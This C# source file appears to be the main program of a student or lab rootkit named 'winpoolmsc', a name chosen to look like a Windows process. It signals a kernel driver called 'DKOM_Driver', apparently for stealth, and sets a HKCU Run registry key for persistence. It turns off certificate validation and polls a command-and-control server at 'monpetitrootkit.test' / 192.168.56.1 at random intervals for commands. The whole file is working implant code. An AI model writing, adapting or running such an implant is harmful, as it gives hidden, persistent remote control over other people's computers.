// Main program
using Flurl.Http;
using Microsoft.Win32;
using System.Runtime.InteropServices;


namespace winpoolmsc;

public class Program
{
    [DllImport("Kernel32")]
    static extern bool SetConsoleCtrlHandler(HandlerRoutine Handler, bool Add);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern IntPtr CreateFile(
    string lpFileName,
    uint dwDesiredAccess,
    uint dwShareMode,
    IntPtr lpSecurityAttributes,
    uint dwCreationDisposition,
    uint dwFlagsAndAttributes,
    IntPtr hTemplateFile);

    [DllImport("kernel32.dll", BestFitMapping = true, CharSet = CharSet.Ansi)]
    public static extern bool WriteFile(
        IntPtr hFile,
        System.Text.StringBuilder lpBuffer,
        uint nNumberOfBytesToWrite,
        out uint lpNumberOfBytesWritten,
        [In] ref System.Threading.NativeOverlapped lpOverlapped);


    public delegate bool HandlerRoutine(CtrlTypes ctrlTypes);

    public enum CtrlTypes
    {
        CTRL_C_EVENT = 0,
        CTRL_BREAK_EVENT,
        CTRL_CLOSE_EVENT,
        CTRL_LOGOFF_EVENT = 5,
        CTRL_SHUTDOWN_EVENT
    }

    private static bool ShutdownCheck(CtrlTypes ctrlTypes)
    {
        IntPtr hFile = CreateFile("\\\\.\\DKOM_Driver", 0x40000000, 0x00000001 | 0x00000002, IntPtr.Zero, 3, 0, IntPtr.Zero);
        uint bwritten;
        NativeOverlapped lp = new NativeOverlapped();

        switch (ctrlTypes)
        {
            case CtrlTypes.CTRL_C_EVENT:
                WriteFile(hFile, new System.Text.StringBuilder("1"), 4, out bwritten, ref lp);
                return true;
            case CtrlTypes.CTRL_LOGOFF_EVENT:
                WriteFile(hFile, new System.Text.StringBuilder("1"), 4, out bwritten, ref lp);
                return true;
            case CtrlTypes.CTRL_SHUTDOWN_EVENT:
                WriteFile(hFile, new System.Text.StringBuilder("1"), 4, out bwritten, ref lp);
                return true;
            default:
                return false;
        }
    }

    static void Main(string[] args)
    {
        IntPtr hFile = CreateFile("\\\\.\\DKOM_Driver", 0x40000000, 0x00000001 | 0x00000002, IntPtr.Zero, 3, 0, IntPtr.Zero);
        uint bwritten;
        NativeOverlapped lp = new NativeOverlapped();
        SetConsoleCtrlHandler(new HandlerRoutine(ShutdownCheck), true);
        WriteFile(hFile, new System.Text.StringBuilder("0"), 4, out bwritten, ref lp);
        
        FlurlHttp.ConfigureClient("https://www.monpetitrootkit.test", cli =>
        cli.Settings.HttpClientFactory = new UntrustedCertClientFactory());

        SetStartup();
        MainAsync().Wait();
    }

    static async Task MainAsync()
    {
        CommandHandler.Instantiate(new Server("www.monpetitrootkit.test", "192.168.56.1", 443));
        CommandHandler.sendCommand();
        Random rand = new Random();

        while(true)
        {
            Thread.Sleep(rand.Next(60000) + 10000);
            CommandHandler.sendCommand();
        }

        CommandHandler.CheckDriverStatus();
    }

    static void SetStartup()
    {
        RegistryKey? rk = null;
        try
        {
           rk  = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        } catch(Exception ex)
        {
            Console.WriteLine(ex.Message);
        }

        bool isset = false;
        foreach(string sub in rk.GetValueNames())
        {
            if (sub == "winpoolmsc" && (string?)rk.GetValue(sub) == $"{AppDomain.CurrentDomain.BaseDirectory}winpoolmsc.exe")
                isset = true;
        }
        
        if (!isset)
        {
            rk.SetValue("winpoolmsc", $"{AppDomain.CurrentDomain.BaseDirectory}winpoolmsc.exe");
        }
        //rk.SetValue(AppName, Application.ExecutablePath);
    }
}


